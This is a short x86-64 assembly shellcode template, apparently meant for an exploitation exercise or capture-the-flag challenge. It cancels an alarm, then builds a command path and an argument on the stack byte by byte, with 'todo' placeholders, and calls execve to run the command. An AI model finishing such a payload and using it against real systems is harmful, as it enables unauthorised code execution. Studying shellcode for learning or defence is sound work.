bits 64

; call alarm(0)
push 37
xor edi, edi
pop rax
syscall

; save the position of the command to execute
mov rdi, rsp
mov rcx, rdi

; todo: repeat this part to create the command to execute
mov byte [rcx], 0x2f
add rcx, 1

; save the position of the argument
mov rdx, rcx

; todo: repeat this part to create the argument
mov byte [rcx], 0x2f
add rcx, 1

; construct the argument array
push 0
push rdx
push rdi
mov rsi, rsp

; prepare system call number for execve
push 59

; call execve
xor edx, edx
pop rax
syscall
